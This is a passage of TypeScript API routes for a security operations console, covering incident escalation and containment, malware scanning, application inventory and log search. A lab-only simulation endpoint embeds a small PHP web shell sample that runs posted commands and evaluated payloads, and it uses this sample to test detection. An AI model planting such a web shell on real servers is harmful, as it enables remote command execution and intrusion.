  const incident = db.prepare('SELECT * FROM incidents WHERE id = ? AND organization_id = ?').get(req.params.id, orgId) as any;
  if (!incident) return res.status(404).json({ error: 'Incident not found' });
  if (!canAccessIncidentTier(req, incident)) {
    return res.status(403).json({ error: incidentScopeError(req) });
  }

  const currentTier = incidentTierOf(incident);
  const scope = incidentScopeForRequest(req);
  if (scope && INCIDENT_TIER_ORDER[targetTier] <= INCIDENT_TIER_ORDER[currentTier]) {
    return res.status(400).json({ error: 'Escalation must target a higher SOC tier' });
  }

  let timeline: any[] = [];
  try {
    timeline = JSON.parse(incident.timeline || '[]');
  } catch {
    timeline = [];
  }

  const prevTier = currentTier;
  const actionText = `SOC Tier escalated: [${prevTier}] → [${targetTier}]${note ? ` - Reason: ${note}` : ''}${assignedTo ? ` (Assigned to ${assignedTo})` : ''}`;

  timeline.push({
    time: new Date().toISOString(),
    note: actionText,
    author: analyst || req.user?.email || 'SOC Escalation Commander',
    tier: targetTier
  });

  const newAssignedTo = assignedTo || incident.assigned_to;
  const newStatus = incident.status === 'NEW' ? 'INVESTIGATING' : incident.status;

  db.prepare(`
    UPDATE incidents
    SET tier = ?, assigned_to = ?, status = ?, timeline = ?, updated_at = datetime('now')
    WHERE id = ?
  `).run(targetTier, newAssignedTo, newStatus, JSON.stringify(timeline), incident.id);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: `Escalate Incident Tier to ${targetTier}`,
    resource: `Incident ${incident.id} (${incident.title})`,
    resourceId: incident.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('incident.updated', { incidentId: incident.id, tier: targetTier, status: newStatus, assignedTo: newAssignedTo }, orgId);

  res.json({ success: true, incident: { ...incident, tier: targetTier, assignedAnalyst: newAssignedTo, status: newStatus, timeline } });
});

apiRouter.delete('/incidents/:id', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const incident = db.prepare('SELECT * FROM incidents WHERE id = ? AND organization_id = ?').get(req.params.id, orgId) as any;
  if (!incident) return res.status(404).json({ error: 'Incident not found' });
  if (!canAccessIncidentTier(req, incident)) {
    return res.status(403).json({ error: incidentScopeError(req) });
  }

  db.prepare('DELETE FROM incidents WHERE id = ? AND organization_id = ?').run(incident.id, orgId);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: 'Delete Incident',
    resource: `Incident ${incident.id} (${incident.title})`,
    resourceId: incident.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('incident.deleted', { incidentId: incident.id }, orgId);
  res.json({ success: true, message: `Incident ${incident.id} deleted` });
});

apiRouter.post('/incidents/:id/assign', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const { analyst, note } = req.body;
  if (!analyst) return res.status(400).json({ error: 'Analyst is required' });

  const incident = db.prepare('SELECT * FROM incidents WHERE id = ? AND organization_id = ?').get(req.params.id, orgId) as any;
  if (!incident) return res.status(404).json({ error: 'Incident not found' });
  if (!canAccessIncidentTier(req, incident)) {
    return res.status(403).json({ error: incidentScopeError(req) });
  }

  let timeline: any[] = [];
  try {
    timeline = JSON.parse(incident.timeline || '[]');
  } catch {
    timeline = [];
  }

  const assignedMessage = `Incident assigned to ${analyst}${note ? `: ${note}` : ''}`;
  timeline.push({
    time: new Date().toISOString(),
    note: assignedMessage,
    author: req.user?.email || 'SOC Lead'
  });

  const newStatus = incident.status === 'NEW' ? 'INVESTIGATING' : incident.status;

  db.prepare(`
    UPDATE incidents
    SET assigned_to = ?, status = ?, timeline = ?, updated_at = datetime('now')
    WHERE id = ?
  `).run(analyst, newStatus, JSON.stringify(timeline), incident.id);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: `Assign Incident to ${analyst}`,
    resource: `Incident ${incident.id} (${incident.title})`,
    resourceId: incident.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('incident.updated', { incidentId: incident.id, status: newStatus, assignedTo: analyst }, orgId);
  res.json({ success: true, incident: { ...incident, assignedAnalyst: analyst, status: newStatus, timeline } });
});

apiRouter.post('/incidents/:id/contain', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId || req.user?.organizationId);
  const { action, target, note, blockIp } = req.body;

  const incident = db.prepare('SELECT * FROM incidents WHERE id = ? AND organization_id = ?').get(req.params.id, orgId) as any;
  if (!incident) return res.status(404).json({ error: 'Incident not found' });
  if (!canAccessIncidentTier(req, incident)) {
    return res.status(403).json({ error: incidentScopeError(req) });
  }

  let timeline: any[] = [];
  try {
    timeline = JSON.parse(incident.timeline || '[]');
  } catch {
    timeline = [];
  }

  let containmentDetail = `Containment action executed: [${action || 'Edge Containment'}] on target "${target || incident.affected_asset}"`;
  if (note) containmentDetail += ` - ${note}`;

  timeline.push({
    time: new Date().toISOString(),
    note: containmentDetail,
    author: req.user?.email || 'SOC Containment Playbook'
  });

  let firewallRuleCreated = false;
  let agentIsolated = false;

  // 1. IP Blocking at perimeter firewall
  const ipToBlock = blockIp || (action === 'BLOCK_IP' ? target : null);
  if (ipToBlock && ipToBlock !== '0.0.0.0' && ipToBlock !== '127.0.0.1') {
    try {
      const fwId = `FW-${Date.now()}`;
      db.prepare(`
        INSERT INTO firewall_rules (id, organization_id, priority, source, destination, port, protocol, action, enabled, description, created_by)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1, ?, ?)
      `).run(
        fwId,
        orgId,
        1,
        ipToBlock,
        '0.0.0.0/0',
        'ANY',
        'ALL',
        'DENY',
        `Containment for Incident ${incident.id} (${incident.title})`,
        req.user?.email || 'SOC Containment Automated Engine'
      );
      firewallRuleCreated = true;
      timeline.push({
        time: new Date().toISOString(),
        note: `Emergency Perimeter Firewall Rule created: DENY source IP ${ipToBlock}`,
        author: 'Firewall Orchestrator'
      });
      SecurityEventBus.publish('rule.updated', { id: fwId, source: ipToBlock, action: 'DENY' }, orgId);
    FirewallDeploymentService.publish(orgId, `Threat intelligence block on IP ${ipToBlock}`);
    } catch (fwErr) {
      console.warn('[Incidents] Automated firewall rule generation note:', fwErr);
    }
  }

  // 2. Real Endpoint Agent containment if target matches an enrolled Agent
  if (action === 'QUARANTINE_HOST' || action === 'ISOLATE_HOST' || action === 'KILL_PROCESS') {
    try {
      const targetQuery = (target || incident.affected_asset || '').trim();
      if (targetQuery) {
        const agent = db.prepare(`
          SELECT * FROM agents 
          WHERE organization_id = ? AND (hostname = ? OR ip = ? OR id = ? OR name = ?)
          LIMIT 1
        `).get(orgId, targetQuery, targetQuery, targetQuery, targetQuery) as any;

        if (agent) {
          const nowStr = new Date().toISOString().slice(0, 19).replace('T', ' ');
          const existingStatus = db.prepare('SELECT agent_id FROM agent_firewall_status WHERE agent_id = ?').get(agent.id);
          const msg = `Emergency host isolation active for Incident ${incident.id}`;
          if (existingStatus) {
            db.prepare(`
              UPDATE agent_firewall_status
              SET status = 'ISOLATED', target = 'HOST_NETWORK', message = ?, rules_applied = 1, applied_at = ?, updated_at = ?
              WHERE agent_id = ?
            `).run(msg, nowStr, nowStr, agent.id);
          } else {
            db.prepare(`
              INSERT INTO agent_firewall_status (
                agent_id, organization_id, status, target, message, rules_applied, applied_at, updated_at
              ) VALUES (?, ?, 'ISOLATED', 'HOST_NETWORK', ?, 1, ?, ?)
            `).run(agent.id, orgId, msg, nowStr, nowStr);
          }
          agentIsolated = true;
          timeline.push({
            time: new Date().toISOString(),
            note: `Agent Server Fleet Containment: Host isolation dispatched to Endpoint Agent "${agent.name}" (${agent.hostname} / ${agent.ip}).`,
            author: 'Agent Defense Orchestrator'
          });
          SecurityEventBus.publish('agent.status', { agentId: agent.id, status: 'ISOLATED' }, orgId);
        }
      }
    } catch (agentErr) {
      console.warn('[Incidents] Agent containment note:', agentErr);
    }
  }

  const updatedStatus = 'CONTAINED';
  db.prepare(`
    UPDATE incidents
    SET status = ?, timeline = ?, updated_at = datetime('now')
    WHERE id = ?
  `).run(updatedStatus, JSON.stringify(timeline), incident.id);

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'analyst@oat.net',
    role: req.user?.role || 'Security Analyst',
    action: `Execute Incident Containment (${action || 'Edge Containment'})`,
    resource: `Incident ${incident.id} (${incident.title})`,
    resourceId: incident.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  SecurityEventBus.publish('incident.updated', { incidentId: incident.id, status: updatedStatus }, orgId);
  res.json({ success: true, incident: { ...incident, status: updatedStatus, timeline }, firewallRuleCreated, agentIsolated });
});


// ----------------------------------------------------------------------
// 9b. Malware Analysis (endpoint upload scanning)
// ----------------------------------------------------------------------
apiRouter.get('/malware/scans', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  try {
    const result = listMalwareScans(orgId, {
      verdict: typeof req.query.verdict === 'string' ? req.query.verdict : undefined,
      status: typeof req.query.status === 'string' ? req.query.status : undefined,
      search: typeof req.query.search === 'string' ? req.query.search : undefined,
      applicationId: typeof req.query.applicationId === 'string' ? req.query.applicationId : undefined,
      limit: req.query.limit ? Number(req.query.limit) : 80,
      offset: req.query.offset ? Number(req.query.offset) : 0
    });
    res.json(result);
  } catch (error) {
    console.error('[Malware] List failed:', error);
    res.status(500).json({ error: 'Could not load malware scans' });
  }
});

apiRouter.get('/malware/scans/:id', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const scan = getMalwareScan(orgId, req.params.id);
  if (!scan) return res.status(404).json({ error: 'Scan not found' });
  res.json({ scan });
});

apiRouter.post('/malware/lookup', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const hash = String(req.body?.hash || '').trim();
  if (!hash) return res.status(400).json({ error: 'Provide an MD5, SHA-1, or SHA-256 hash' });
  res.json(lookupMalwareHash(orgId, hash));
});

apiRouter.post('/malware/analyze', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const body = req.body || {};
  const fileName = String(body.fileName || '').trim();
  const contentBase64 = typeof body.contentBase64 === 'string' ? body.contentBase64 : '';

  if (!fileName || !contentBase64) {
    return res.status(400).json({ error: 'fileName and contentBase64 are required' });
  }
  if (contentBase64.length > 6_000_000) {
    return res.status(413).json({ error: 'Sample too large. Analyze files up to 4 MB from the console.' });
  }

  try {
    const scan = scanAndRecord({
      organizationId: orgId,
      fileName,
      filePath: String(body.filePath || fileName).slice(0, 2048),
      size: Number(body.size) || undefined,
      contentBase64,
      source: 'console',
      notify: false
    });

    recordAuditLog({
      organizationId: orgId,
      userEmail: req.user?.email || 'analyst@oat.net',
      role: req.user?.role || 'Security Analyst',
      action: 'Analyze File Sample',
      resource: `Malware scan ${scan.id} (${scan.fileName})`,
      resourceId: scan.id,
      ipAddress: req.ip || '127.0.0.1',
      userAgent: req.headers['user-agent']
    });

    res.json({ scan });
  } catch (error) {
    console.error('[Malware] Console analysis failed:', error);
    res.status(500).json({ error: 'Malware analysis failed' });
  }
});

apiRouter.post('/malware/scans/:id/action', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const action = String(req.body?.action || '').toUpperCase();
  try {
    const result = requestMalwareAction(orgId, req.params.id, action, req.user?.email || 'analyst@oat.net');
    recordAuditLog({
      organizationId: orgId,
      userEmail: req.user?.email || 'analyst@oat.net',
      role: req.user?.role || 'Security Analyst',
      action: `Malware Containment (${action})`,
      resource: `Malware scan ${req.params.id} (${result.scan.fileName})`,
      resourceId: req.params.id,
      ipAddress: req.ip || '127.0.0.1',
      userAgent: req.headers['user-agent']
    });
    res.json(result);
  } catch (error) {
    const message = error instanceof Error ? error.message : 'Containment action failed';
    res.status(message === 'Scan not found' ? 404 : 400).json({ error: message });
  }
});

apiRouter.get('/malware/signatures', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  res.json({ signatures: listMalwareSignatures(orgId) });
});

apiRouter.post('/malware/signatures', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  try {
    const signature = addMalwareSignature(orgId, req.body || {}, req.user?.email || 'analyst@oat.net');
    res.status(201).json({ signature });
  } catch (error) {
    res.status(400).json({ error: error instanceof Error ? error.message : 'Invalid signature' });
  }
});

/** Lab helper: pushes a real web shell sample through the whole pipeline.
 *  Disabled by default so a production console never writes synthetic data. */
apiRouter.post('/malware/simulate', (req: AuthenticatedRequest, res) => {
  if (process.env.ENABLE_MALWARE_SIMULATION !== 'true' || process.env.NODE_ENV === 'production') {
    return res.status(404).json({ error: 'Not found' });
  }
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const sample = `<?php\n// OAT detection test payload\n$cmd = $_POST['cmd'];\nsystem($cmd);\n$data = base64_decode($_POST['payload']);\neval($data);\n?>\n`;
  const agents = db.prepare(`
    SELECT id, application_id, hostname FROM agents
    WHERE organization_id = ? AND revoked_at IS NULL ORDER BY created_at ASC LIMIT 1
  `).all(orgId) as any[];
  const agent = agents[0];
  const fileName = `oat-test-shell-${Date.now()}.php`;
  try {
    const scan = scanAndRecord({
      organizationId: orgId,
      applicationId: agent?.application_id || null,
      agentId: agent?.id || null,
      fileName,
      filePath: `/var/www/html/uploads/${fileName}`,
      contentBase64: Buffer.from(sample, 'utf8').toString('base64'),
      source: 'agent',
      sourceIp: '203.0.113.42',
      requestUri: `/uploads/${fileName}`,
      method: 'POST',
      hostname: agent?.hostname || 'edge-gateway-01',
      notify: true
    });
    res.status(201).json({ success: true, scan });
  } catch (error) {
    res.status(500).json({ error: error instanceof Error ? error.message : 'Simulation failed' });
  }
});

// ----------------------------------------------------------------------
// 10. Application & Network Inventory
// ----------------------------------------------------------------------
apiRouter.get('/applications', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const { environment, status, search } = req.query;

  // The inventory follows reality: websites no agent reports any more are
  // dropped before the list is returned.
  try {
    pruneStaleApplications(orgId);
  } catch (err) {
    console.warn('[Applications] Prune failed:', err);
  }

  let query = 'SELECT * FROM applications WHERE organization_id = ?';
  const params: any[] = [orgId];

  if (environment && environment !== 'ALL') {
    query += ' AND LOWER(environment) = ?';
    params.push(String(environment).toLowerCase());
  }
  if (status && status !== 'ALL') {
    query += ' AND LOWER(status) = ?';
    params.push(String(status).toLowerCase());
  }
  if (search) {
    query += ' AND (LOWER(name) LIKE ? OR LOWER(domain) LIKE ? OR LOWER(origin_ip) LIKE ?)';
    const term = `%${String(search).toLowerCase()}%`;
    params.push(term, term, term);
  }

  query += ' ORDER BY created_at ASC';
  const apps = db.prepare(query).all(...params) as any[];

  // For each app, aggregate real telemetry metrics from security_events and threats tables
  const enrichedApps = apps.map(app => {
    // Real request and blocked request counts from security_events
    const eventStats = db.prepare(`
      SELECT 
        COUNT(*) as requests_count,
        SUM(CASE WHEN action IN ('BLOCK', 'BLOCKED', 'DENY', 'DROP') THEN 1 ELSE 0 END) as blocked_count,
        MAX(timestamp) as last_seen
      FROM security_events
      WHERE organization_id = ? AND (
        application = ? OR application = ? OR uri LIKE ? OR destination_ip = ?
      )
    `).get(orgId, app.name, app.domain, `%${app.domain}%`, app.origin_ip) as any;

    // Check active threats for threat level
    const threatCheck = db.prepare(`
      SELECT severity FROM threats
      WHERE organization_id = ? AND (
        affected_application = ? OR affected_application = ? OR target = ? OR destination LIKE ?
      ) AND status NOT IN ('RESOLVED', 'FALSE_POSITIVE')
      ORDER BY CASE severity 
        WHEN 'Critical' THEN 1 
        WHEN 'High' THEN 2 
        WHEN 'Medium' THEN 3 
        ELSE 4 END ASC
      LIMIT 1
    `).get(orgId, app.name, app.domain, app.origin_ip, `%${app.domain}%`) as any;

    const threatLevel = threatCheck ? threatCheck.severity.toUpperCase() : 'LOW';
    const agentStats = db.prepare(`
      SELECT COUNT(*) as count FROM agents
      WHERE organization_id = ? AND application_id = ? AND revoked_at IS NULL
    `).get(orgId, app.id) as any;

    return {
      id: app.id,
      name: app.name,
      domain: app.domain,
      originIp: app.origin_ip || '127.0.0.1',
      environment: (app.environment || 'PRODUCTION').toUpperCase(),
      status: app.status || 'UNKNOWN',
      wafStatus: 'ACTIVE',
      tlsStatus: 'VALID (TLS 1.3)',
      health: app.status || 'UNKNOWN',
      threatLevel,
      agentCount: Number(agentStats?.count) || 0,
      protocol: app.protocol || 'HTTPS',
      port: app.port || 443,
      owner: app.owner || 'SecOps Engineering',
      lastSeen: app.last_seen || eventStats?.last_seen || app.updated_at || app.created_at,
      requests24h: Number(eventStats?.requests_count) || 0,
      blocked24h: Number(eventStats?.blocked_count) || 0,
      responseTime: 1.2,
      createdAt: app.created_at
    };
  });

  // Calculate real metrics across all apps in database for this org
  const allOrgApps = db.prepare('SELECT status FROM applications WHERE organization_id = ?').all(orgId) as any[];
  const metrics = {
    total: allOrgApps.length,
    protected: allOrgApps.filter(a => String(a.status).toUpperCase() === 'ONLINE').length,
    monitoring: allOrgApps.filter(a => String(a.status).toUpperCase() === 'DEGRADED').length,
    offline: allOrgApps.filter(a => String(a.status).toUpperCase() === 'OFFLINE').length,
    unknown: allOrgApps.filter(a => !['ONLINE', 'DEGRADED', 'OFFLINE'].includes(String(a.status).toUpperCase())).length
  };

  res.json({
    applications: enrichedApps,
    total: enrichedApps.length,
    metrics
  });
});

// Single application detail endpoint
apiRouter.get('/applications/:id', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const app = db.prepare('SELECT * FROM applications WHERE id = ? AND organization_id = ?').get(req.params.id, orgId) as any;
  if (!app) return res.status(404).json({ error: 'Application asset not found' });

  // Query recent security events for this application
  const recentEvents = db.prepare(`
    SELECT * FROM security_events
    WHERE organization_id = ? AND (
      application = ? OR application = ? OR uri LIKE ? OR destination_ip = ?
    )
    ORDER BY timestamp DESC LIMIT 20
  `).all(orgId, app.name, app.domain, `%${app.domain}%`, app.origin_ip) as any[];

  // Query active threats for this application
  const activeThreats = db.prepare(`
    SELECT * FROM threats
    WHERE organization_id = ? AND (
      affected_application = ? OR affected_application = ? OR target = ? OR destination LIKE ?
    )
    ORDER BY timestamp DESC LIMIT 10
  `).all(orgId, app.name, app.domain, app.origin_ip, `%${app.domain}%`) as any[];

  const agentRows = db.prepare(`
    SELECT id, name, hostname, os, arch, version, ip, last_seen, events_ingested, logs_ingested
    FROM agents
    WHERE organization_id = ? AND application_id = ? AND revoked_at IS NULL
    ORDER BY last_seen DESC
  `).all(orgId, app.id) as any[];
  const now = Date.now();
  const agents = agentRows.map(agent => {
    const lastSeen = agent.last_seen ? Date.parse(agent.last_seen) : NaN;
    const age = Number.isFinite(lastSeen) ? now - lastSeen : Infinity;
    const status = !Number.isFinite(age)
      ? 'PENDING'
      : age < 2 * 60 * 1000
        ? 'ONLINE'
        : age < 7 * 24 * 60 * 60 * 1000
          ? 'OFFLINE'
          : 'STALE';
    return {
      id: agent.id,
      name: agent.name,
      hostname: agent.hostname,
      os: agent.os,
      arch: agent.arch,
      version: agent.version,
      ip: agent.ip,
      status,
      lastSeen: agent.last_seen,
      eventsIngested: Number(agent.events_ingested) || 0,
      logsIngested: Number(agent.logs_ingested) || 0
    };
  });

  res.json({
    application: {
      id: app.id,
      name: app.name,
      domain: app.domain,
      originIp: app.origin_ip || '127.0.0.1',
      environment: (app.environment || 'PRODUCTION').toUpperCase(),
      status: app.status || 'UNKNOWN',
      wafStatus: 'ACTIVE',
      tlsStatus: 'VALID (TLS 1.3)',
      health: app.status || 'UNKNOWN',
      protocol: app.protocol || 'HTTPS',
      port: app.port || 443,
      owner: app.owner || 'SecOps Core',
      createdAt: app.created_at,
      updatedAt: app.updated_at
    },
    recentEvents: recentEvents.map(r => ({
      id: r.id,
      timestamp: r.timestamp,
      source: r.source,
      sourceIp: r.source_ip,
      destinationIp: r.destination_ip,
      threat: r.threat_name,
      severity: r.severity,
      action: r.action,
      uri: r.uri,
      method: r.method,
      statusCode: r.status_code
    })),
    activeThreats: activeThreats.map(t => ({
      id: t.id,
      timestamp: t.timestamp,
      sourceIp: t.source_ip,
      attackType: t.attack_type,
      severity: t.severity,
      status: t.status,
      action: t.action
    })),
    agents
  });
});

// Remove a website from the inventory
apiRouter.delete('/applications/:id', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const appId = req.params.id;
  const app = db.prepare('SELECT id, name, domain FROM applications WHERE id = ? AND organization_id = ?').get(appId, orgId) as
    { id: string; name: string; domain: string } | undefined;
  if (!app) {
    return res.status(404).json({ error: 'Application asset not found' });
  }

  // Agents that watched this website keep running, they are simply unbound.
  db.prepare('UPDATE agents SET application_id = NULL WHERE application_id = ?').run(app.id);

  removeApplication(app.id, orgId, 'Removed by an operator');

  recordAuditLog({
    organizationId: orgId,
    userId: req.user?.userId,
    userEmail: req.user?.email || 'unknown',
    role: req.user?.role || 'Unknown',
    action: 'application.removed',
    resource: 'application',
    resourceId: app.id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent'],
    metadata: { name: app.name, domain: app.domain }
  });

  return res.json({ success: true, removed: true, id: app.id });
});

// Clear/purge security events recorded for a specific application
apiRouter.delete('/applications/:id/events', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const appId = req.params.id;
  const app = db.prepare('SELECT id, name, domain, origin_ip FROM applications WHERE id = ? AND organization_id = ?').get(appId, orgId) as
    { id: string; name: string; domain: string; origin_ip: string } | undefined;
  if (!app) {
    return res.status(404).json({ error: 'Application asset not found' });
  }

  const result = db.prepare(`
    DELETE FROM security_events
    WHERE organization_id = ? AND (
      application = ? OR application = ? OR uri LIKE ? OR destination_ip = ?
    )
  `).run(orgId, app.name, app.domain, `%${app.domain}%`, app.origin_ip);

  return res.json({ success: true, deleted: result.changes });
});

// Run live health check on application
const handleAppHealthCheck = async (req: AuthenticatedRequest, res: Response) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const appId = req.params.id;

  const app = db.prepare('SELECT * FROM applications WHERE id = ? AND organization_id = ?').get(appId, orgId) as any;
  if (!app) return res.status(404).json({ error: 'Application asset not found' });

  // Run probe with origin_ip fallback
  const probe = await probeApplicationHealth(app.domain, app.port || 443, 2000, app.origin_ip);
  const now = new Date().toISOString();

  db.prepare(`
    UPDATE applications
    SET status = ?, last_seen = ?, updated_at = ?
    WHERE id = ? AND organization_id = ?
  `).run(probe.status, now, now, appId, orgId);

  const payload = {
    id: appId,
    name: app.name,
    domain: app.domain,
    status: probe.status,
    responseTime: probe.latencyMs,
    lastCheckedAt: now
  };

  // Broadcast health change via WebSocket
  SecurityEventBus.publish('application.health_changed', payload, orgId);

  res.json(payload);
};

apiRouter.get('/applications/:id/health', handleAppHealthCheck);
apiRouter.post('/applications/:id/health', handleAppHealthCheck);

// Register a new application
apiRouter.post('/applications', (req: AuthenticatedRequest, res) => {
  const orgId = WafDeploymentService.resolveOrgId(req.organizationId);
  const { name, domain, originIp, origin_ip, environment, description, protocol, port } = req.body;

  if (!name || !domain) {
    return res.status(400).json({ error: 'Application name and domain are required.' });
  }

  // Authorization check (Viewer cannot add application)
  if (req.user?.role === 'Viewer') {
    return res.status(403).json({ error: 'Insufficient permission: Viewer role cannot create applications.' });
  }

  const id = `APP-${Date.now()}`;
  const resolvedIp = originIp || origin_ip || '127.0.0.1';
  const resolvedEnv = (environment || 'PRODUCTION').toUpperCase();
  const resolvedPort = Number(port) || 443;
  const resolvedProtocol = (protocol || 'HTTPS').toUpperCase();

  db.prepare(`
    INSERT INTO applications (id, organization_id, name, domain, origin_ip, environment, status, owner, protocol, port)
    VALUES (?, ?, ?, ?, ?, ?, 'ONLINE', ?, ?, ?)
  `).run(
    id,
    orgId,
    name.trim(),
    domain.trim(),
    resolvedIp.trim(),
    resolvedEnv,
    description || 'Security Operations Asset',
    resolvedProtocol,
    resolvedPort
  );

  recordAuditLog({
    organizationId: orgId,
    userEmail: req.user?.email || 'admin@oat.net',
    role: req.user?.role || 'Security Admin',
    action: 'Add Protected Application Asset',
    resource: `${name} (${domain})`,
    resourceId: id,
    ipAddress: req.ip || '127.0.0.1',
    userAgent: req.headers['user-agent']
  });

  const createdApp = {
    id,
    name: name.trim(),
    domain: domain.trim(),
    originIp: resolvedIp.trim(),
    environment: resolvedEnv,
    status: 'ONLINE',
    wafStatus: 'ACTIVE',
    tlsStatus: 'VALID (TLS 1.3)',
    health: 'ONLINE',
    threatLevel: 'LOW',
    protocol: resolvedProtocol,
    port: resolvedPort,
    requests24h: 0,
    blocked24h: 0,
    lastSeen: new Date().toISOString(),
    createdAt: new Date().toISOString()
  };

  // Broadcast application.created event to event bus & WebSocket
  SecurityEventBus.publish('application.created', createdApp, orgId);

  res.json({ success: true, application: createdApp });
});

// ----------------------------------------------------------------------
// 10b. Centralized Security Logs
// ----------------------------------------------------------------------
apiRouter.get('/logs', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const { level, source, eventType, host, search, page = 1, limit = 50 } = req.query;

  let query = 'SELECT * FROM logs WHERE organization_id = ?';
  const params: any[] = [orgId];

  if (level && level !== 'ALL') {
    query += ' AND LOWER(level) = ?';
    params.push(String(level).toLowerCase());
  }
  if (source && source !== 'ALL') {
    query += ' AND LOWER(source) = ?';
    params.push(String(source).toLowerCase());
  }
  if (eventType && eventType !== 'ALL') {
    query += ' AND LOWER(event_type) = ?';
    params.push(String(eventType).toLowerCase());
  }
  if (host && host !== 'ALL') {
    query += ' AND LOWER(host) LIKE ?';
    params.push(`%${String(host).toLowerCase()}%`);
  }
  if (search) {
    query += ' AND (LOWER(message) LIKE ? OR LOWER(ip) LIKE ? OR LOWER(correlation_id) LIKE ? OR LOWER(event_type) LIKE ?)';
    const term = `%${String(search).toLowerCase()}%`;
    params.push(term, term, term, term);
  }

  // Calculate metrics
  const metricsRow = db.prepare(`
    SELECT 
      COUNT(*) as total,
      SUM(CASE WHEN LOWER(level) = 'critical' THEN 1 ELSE 0 END) as critical,
      SUM(CASE WHEN LOWER(level) = 'error' THEN 1 ELSE 0 END) as error,
      SUM(CASE WHEN LOWER(level) = 'warn' THEN 1 ELSE 0 END) as warn,
      SUM(CASE WHEN LOWER(level) = 'info' THEN 1 ELSE 0 END) as info,
      SUM(CASE WHEN LOWER(level) = 'debug' THEN 1 ELSE 0 END) as debug
    FROM logs
    WHERE organization_id = ?
  `).get(orgId) as any;

  const metrics = {
    total: Number(metricsRow?.total) || 0,
    critical: Number(metricsRow?.critical) || 0,
    error: Number(metricsRow?.error) || 0,
    warn: Number(metricsRow?.warn) || 0,
    info: Number(metricsRow?.info) || 0,
    debug: Number(metricsRow?.debug) || 0
  };

  // Top source IPs from logs
  const topSourceIps = (db.prepare(`
    SELECT ip, COUNT(*) as count
    FROM logs
    WHERE organization_id = ? AND ip IS NOT NULL AND ip != '' AND ip != '—'
    GROUP BY ip
    ORDER BY count DESC
    LIMIT 10
  `).all(orgId) as Array<{ ip: string; count: number }>).map(row => {
    const geo = lookupIpLocation(row.ip);
    return { ...row, sourceCountry: geo.country, sourceCountryCode: geo.code, sourceCountryFlag: geo.flag };
  });

  // Top sources from logs
  const topSources = (db.prepare(`
    SELECT source, COUNT(*) as count
    FROM logs
    WHERE organization_id = ? AND source IS NOT NULL AND source != ''
    GROUP BY source
    ORDER BY count DESC
    LIMIT 10
  `).all(orgId) as Array<{ source: string; count: number }>);

  // Count matching logs for pagination
  let countSql = 'SELECT COUNT(*) as count FROM logs WHERE organization_id = ?';
  if (level && level !== 'ALL') countSql += ' AND LOWER(level) = ?';
  if (source && source !== 'ALL') countSql += ' AND LOWER(source) = ?';
  if (eventType && eventType !== 'ALL') countSql += ' AND LOWER(event_type) = ?';
  if (host && host !== 'ALL') countSql += ' AND LOWER(host) LIKE ?';
  if (search) countSql += ' AND (LOWER(message) LIKE ? OR LOWER(ip) LIKE ? OR LOWER(correlation_id) LIKE ? OR LOWER(event_type) LIKE ?)';
  const filteredCount = db.prepare(countSql).get(...params) as { count?: number } | undefined;
  const totalCount = typeof filteredCount?.count === 'number' ? filteredCount.count : metrics.total;

  query += ' ORDER BY timestamp DESC';
  const pageNum = Math.max(1, Number(page) || 1);
  const limitNum = Math.min(1000, Math.max(1, Number(limit) || 50));
  const offset = (pageNum - 1) * limitNum;
  query += ` LIMIT ${limitNum} OFFSET ${offset}`;

  const rows = db.prepare(query).all(...params) as any[];

  const logs = rows.map(r => ({
    id: r.id,
    timestamp: r.timestamp,
    level: r.level,
    source: r.source,
    eventType: r.event_type,
    message: r.message,
    host: r.host,
    ip: r.ip,
    correlationId: r.correlation_id,
    metadata: r.metadata ? JSON.parse(r.metadata) : undefined,
    rawLog: r.raw_log
  }));

  res.json({
    logs,
    total: totalCount,
    page: pageNum,
    limit: limitNum,
    metrics,
    topSourceIps,
    topSources
  });
});

apiRouter.get('/logs/:id', (req: AuthenticatedRequest, res) => {
  const orgId = req.organizationId || '';
  const log = db.prepare('SELECT * FROM logs WHERE id = ? AND organization_id = ?').get(req.params.id, orgId) as any;
  if (!log) return res.status(404).json({ error: 'Log entry not found' });

  res.json({
    id: log.id,
    timestamp: log.timestamp,
